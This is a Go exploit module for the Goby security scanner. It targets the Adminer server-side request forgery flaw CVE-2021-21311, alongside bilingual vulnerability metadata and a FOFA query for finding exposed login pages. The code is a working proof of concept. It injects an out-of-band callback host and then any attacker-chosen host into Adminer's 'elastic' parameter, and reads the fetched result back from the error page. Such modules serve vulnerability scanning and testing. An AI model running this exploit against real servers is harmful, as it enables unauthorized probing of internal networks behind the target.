package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Adminer adminer Api SSRF Vulnerability (CVE-2021-21311)",
    "Description": "<p>Adminer is an application software of the SOURCEFORGE community in the United States. Provides database management in a single PHP file.</p><p>There is a code problem vulnerability in Adminer, which originates from elastic parameters, and attackers can detect intranet information.</p>",
    "Impact": "<p>Adminer SSRF (CVE-2021-21311)</p>",
    "Recommendation": "<p>Follow the official website update in time: <a href=\"https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351\">https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351</a></p>",
    "Product": "Adminer",
    "VulType": [
        "Other"
    ],
    "Tags": [
        "Other"
    ],
    "Translation": {
        "CN": {
            "Name": "Adminer 软件 adminer 接口 SSRF 漏洞（CVE-2021-21311）",
            "Product": "Adminer",
            "Description": "<p>Adminer是美国SOURCEFORGE社区的一个应用软件。提供单个PHP文件中的数据库管理。<br></p><p>Adminer 中存在代码问题漏洞，该漏洞源于elastic参数，攻击者可探测内网信息等。<br></p>",
            "Recommendation": "<p>及时关注官网更新：<a href=\"https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351\">https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351</a><br></p>",
            "Impact": "<p>Adminer 中存在代码问题漏洞，该漏洞源于elastic参数，攻击者可探测内网信息等。<br></p>",
            "VulType": [
                "其它"
            ],
            "Tags": [
                "其它"
            ]
        },
        "EN": {
            "Name": "Adminer adminer Api SSRF Vulnerability (CVE-2021-21311)",
            "Product": "Adminer",
            "Description": "<p>Adminer is an application software of the SOURCEFORGE community in the United States. Provides database management in a single PHP file.<br></p><p>There is a code problem vulnerability in Adminer, which originates from elastic parameters, and attackers can detect intranet information.<br></p>",
            "Recommendation": "<p>Follow the official website update in time: <a href=\"https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351\">https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351</a><br></p>",
            "Impact": "<p>Adminer SSRF (CVE-2021-21311)</p>",
            "VulType": [
                "Other"
            ],
            "Tags": [
                "Other"
            ]
        }
    },
    "FofaQuery": "title=\"Login - Adminer\"",
    "GobyQuery": "title=\"Login - Adminer\"",
    "Author": "abszse",
    "Homepage": "https://github.com/vrana/adminer/",
    "DisclosureDate": "2022-04-01",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2021-21311"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202102-1087"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "gobygo.net",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10362"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			RandStr := goutils.RandomHexString(4)
			Godserver, _ := godclient.GetGodCheckURL(RandStr)
			uri := "/adminer?elastic=" + Godserver + "&username="
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 403 && strings.Contains(resp.Utf8Html, "&lt;html&gt;&lt;body&gt;GodServer&lt;/body&gt;&lt;/html&gt;")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/adminer?elastic=" + cmd + "&username="
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 403 {
					Regex := regexp.MustCompile("<div class='error'>(.*?)</div>").FindStringSubmatch(resp.Utf8Html)
					expResult.Output = Regex[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
